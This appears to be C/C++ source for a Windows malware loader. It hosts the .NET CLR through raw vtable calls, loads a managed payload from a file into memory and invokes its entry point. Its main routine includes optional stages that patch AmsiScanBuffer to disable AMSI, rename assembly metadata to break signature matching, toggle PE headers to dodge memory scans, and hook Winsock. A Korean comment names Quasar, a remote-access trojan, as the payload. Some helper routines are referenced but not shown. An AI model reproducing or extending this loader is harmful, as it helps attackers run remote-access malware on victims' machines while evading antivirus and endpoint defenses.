static void* Vtbl(void*o,size_t i){return(*(void***)o)[i];}

enum : size_t {
    VTBL_META_GET_RUNTIME        = 3,
    VTBL_INFO_GET_INTERFACE      = 9,
    VTBL_INFO_IS_LOADABLE        = 10,
    VTBL_HOST_START              = 10,
    VTBL_HOST_STOP               = 11,
    VTBL_HOST_GET_DEFAULT_DOMAIN = 13,
    VTBL_APPDOMAIN_LOAD_3        = 45,
    VTBL_ASSEMBLY_ENTRY_POINT    = 16,
    VTBL_METHODINFO_INVOKE_3     = 37
};

static bool RunManaged(char*data,DWORD sz){
    auto pCoInit   = &CoInitializeEx;
    auto pCoUninit = &CoUninitialize;
    auto pCLRCr    = &CLRCreateInstance;
    auto pSACV     = &SafeArrayCreateVector;
    auto pSAAD     = &SafeArrayAccessData;
    auto pSAUAD    = &SafeArrayUnaccessData;
    auto pSAD      = &SafeArrayDestroy;
    auto pSAPE     = &SafeArrayPutElement;
    auto pVInit    = &VariantInit;
    auto pVClr     = &VariantClear;
    auto pVCT      = &VariantChangeType;

    bool comInit=false;
    void *meta=NULL,*info=NULL,*host=NULL;
    IUnknown*unkDom=NULL; IDispatch*dom=NULL,*asm_=NULL,*ep=NULL;
    bool ok=false, loadOnly=false; LONG ret=0;
    const char*stage="CoInitializeEx";

    HRESULT hr=pCoInit(NULL,COINIT_APARTMENTTHREADED);
    if(SUCCEEDED(hr))comInit=true; else if(hr!=RPC_E_CHANGED_MODE)return false;

    stage="CLRCreateInstance";
    hr=pCLRCr(CLSID_MetaHost_,IID_MetaHost_,(LPVOID*)&meta); if(FAILED(hr))goto cl;
    stage="ICLRMetaHost::GetRuntime";
    {typedef HRESULT(STDMETHODCALLTYPE*fnGR)(void*,LPCWSTR,REFIID,LPVOID*);
     hr=((fnGR)Vtbl(meta,VTBL_META_GET_RUNTIME))(meta,L"v4.0.30319",IID_RTInfo_,(LPVOID*)&info);} if(FAILED(hr))goto cl;
    stage="ICLRRuntimeInfo::IsLoadable";
    {typedef HRESULT(STDMETHODCALLTYPE*fnIL)(void*,BOOL*); BOOL ld=FALSE;
     hr=((fnIL)Vtbl(info,VTBL_INFO_IS_LOADABLE))(info,&ld); if(FAILED(hr)||!ld){if(SUCCEEDED(hr))hr=E_FAIL;goto cl;}}
    stage="ICLRRuntimeInfo::GetInterface";
    {typedef HRESULT(STDMETHODCALLTYPE*fnGI)(void*,REFCLSID,REFIID,LPVOID*);
     hr=((fnGI)Vtbl(info,VTBL_INFO_GET_INTERFACE))(info,CLSID_CORHost_,IID_CORHost_,(LPVOID*)&host);} if(FAILED(hr))goto cl;
    stage="ICorRuntimeHost::Start";
    {typedef HRESULT(STDMETHODCALLTYPE*fnSt)(void*);
     hr=((fnSt)Vtbl(host,VTBL_HOST_START))(host);} if(FAILED(hr))goto cl;
    stage="ICorRuntimeHost::GetDefaultDomain";
    {typedef HRESULT(STDMETHODCALLTYPE*fnGDD)(void*,IUnknown**);
     hr=((fnGDD)Vtbl(host,VTBL_HOST_GET_DEFAULT_DOMAIN))(host,&unkDom);} if(FAILED(hr))goto cl;
    stage="QueryInterface(_AppDomain)";
    hr=unkDom->QueryInterface(IID_AppDomain_,(void**)&dom); if(FAILED(hr))goto cl;

    stage="_AppDomain::Load_3";
    LOG("[i] _AppDomain::Load_3 begin\n");
    fflush(stdout);
    {SAFEARRAY*bytes=pSACV(VT_UI1,0,sz); if(!bytes){hr=E_OUTOFMEMORY;goto cl;}
     BYTE*dst=NULL; hr=pSAAD(bytes,(void**)&dst);
     if(SUCCEEDED(hr)){memcpy(dst,data,sz);pSAUAD(bytes);
         typedef HRESULT(STDMETHODCALLTYPE*fnL)(void*,SAFEARRAY*,void**);
         hr=((fnL)Vtbl(dom,VTBL_APPDOMAIN_LOAD_3))(dom,bytes,(void**)&asm_);}
     pSAD(bytes);} if(FAILED(hr))goto cl;

    LOG("[+] _AppDomain::Load_3 OK\n");
#if ENABLE_RESTORE_AMSI_AFTER_LOAD && ENABLE_AMSI_L2
    RestoreAmsiScanBuffer();
#endif
#if ENABLE_SOURCE_WIPE_AFTER_LOAD
    SecureZeroMemory(data, sz);
    LOG("[+] Source PE buffer erased\n");
#endif
    fflush(stdout);

    stage="_Assembly::get_EntryPoint";
    {typedef HRESULT(STDMETHODCALLTYPE*fnGEP)(void*,void**);
     hr=((fnGEP)Vtbl(asm_,VTBL_ASSEMBLY_ENTRY_POINT))(asm_,(void**)&ep);} if(FAILED(hr)||!ep){if(SUCCEEDED(hr))hr=E_FAIL;goto cl;}

    LOG("[+] Managed EntryPoint acquired\n");
    fflush(stdout);

#if ENABLE_LOAD_ONLY
    stage="LOAD_ONLY";
    loadOnly=true;
    ok=true;
    LOG("[*] LOAD_ONLY: waiting %lu ms without Invoke_3\n",
        (unsigned long)LOAD_ONLY_WAIT_MS);
    fflush(stdout);
    Sleep(LOAD_ONLY_WAIT_MS);
    LOG("[+] LOAD_ONLY observation window survived\n");
    goto cl;
#endif

    stage="_MethodInfo::Invoke_3";
    LOG("[i] _MethodInfo::Invoke_3 begin\n");
    fflush(stdout);
    for(int att=0;att<2&&!ok;att++){
        SAFEARRAY*params=pSACV(VT_VARIANT,0,att==1?1:0); if(!params)continue;
        if(att==1){
            SAFEARRAY*args=pSACV(VT_BSTR,0,0);
            VARIANT arg; pVInit(&arg); V_VT(&arg)=VT_ARRAY|VT_BSTR; V_ARRAY(&arg)=args;
            LONG idx=0; if(pSAPE)pSAPE(params,&idx,&arg); pVClr(&arg);
        }
        VARIANT tgt,res; pVInit(&tgt); pVInit(&res); V_VT(&tgt)=VT_NULL;
        typedef HRESULT(STDMETHODCALLTYPE*fnInv)(void*,VARIANT,SAFEARRAY*,VARIANT*);
        fflush(stdout);
        hr=((fnInv)Vtbl(ep,VTBL_METHODINFO_INVOKE_3))(ep,tgt,params,&res);
        if(SUCCEEDED(hr)){ok=true;
            if(pVCT){VARIANT cv;pVInit(&cv);if(SUCCEEDED(pVCT(&cv,&res,0,VT_I4)))ret=V_I4(&cv);pVClr(&cv);}
        }
        pVClr(&res); pSAD(params);
    }
cl:
#if ENABLE_AMSI_L2
    if(g_AmsiScanPatched) RestoreAmsiScanBuffer();
#endif
    if(ep)ep->Release(); if(asm_)asm_->Release(); if(dom)dom->Release(); if(unkDom)unkDom->Release();
    if(host){typedef HRESULT(STDMETHODCALLTYPE*fnSt)(void*);((fnSt)Vtbl(host,VTBL_HOST_STOP))(host);((IUnknown*)host)->Release();}
    if(info)((IUnknown*)info)->Release(); if(meta)((IUnknown*)meta)->Release();
    if(comInit&&pCoUninit)pCoUninit();
    if(ok && loadOnly) LOG("[+] LOAD_ONLY complete\n");
    else if(ok) LOG("[+] Managed entry returned %ld\n",ret);
    else LOG("[-] Managed failed at %s (hr=0x%08lX)\n",stage,(unsigned long)hr);
    return ok;
}

/* ================================================================
 * main
 * ================================================================ */
int main(int argc, char** argv){
    if(argc!=3||_stricmp(argv[1],"file")!=0){
        LOG("Usage: %s file <hsf>\n",argv[0]);
        return 1;
    }

    DATA payload=LoadHSF(argv[2]);
    if(!payload.data||!payload.len) return 2;

    if(!IsMgd(payload.data,payload.len)){
        LOG("[!] Managed-only loader — Native payload rejected\n");
        free(payload.data);
        return 3;
    }
    LOG("[*] Payload type: Managed (C#)\n");

#if ENABLE_ASSEMBLY_STOMP
    /* Load_3 전에 메타데이터 rename → IL 시그니처 매치 파괴 시도 */
    StompAssemblyName((BYTE*)payload.data, (DWORD)payload.len);
#endif

#if ENABLE_PE_FLUCTUATION
    /* Load_3 이전 heap 스캔 창 회피: 헤더 토글 백그라운드 스레드 */
    StartPayloadFluctuation(payload.data);
    Sleep(3000 + (rand() % 2000));
    StopPayloadFluctuation();
#endif

#if ENABLE_AMSI_L2
    /* CLR 초기화 전에 AMSI 스캔 무력화 */
    PatchAmsiScanBuffer();
#endif

#if ENABLE_SEND_THROTTLE
    /* CLR/Quasar 실행 전에 Winsock 훅 설치.
       이후 CLR이 로드하는 SslStream/Socket도 이 훅을 경유. */
    InstallSendThrottle();
#endif

    bool ok=RunManaged((char*)payload.data,(DWORD)payload.len);

    free(payload.data);
    LOG(ok?"[+] Done\n":"[-] Failed\n");
    return ok?0:2;
}
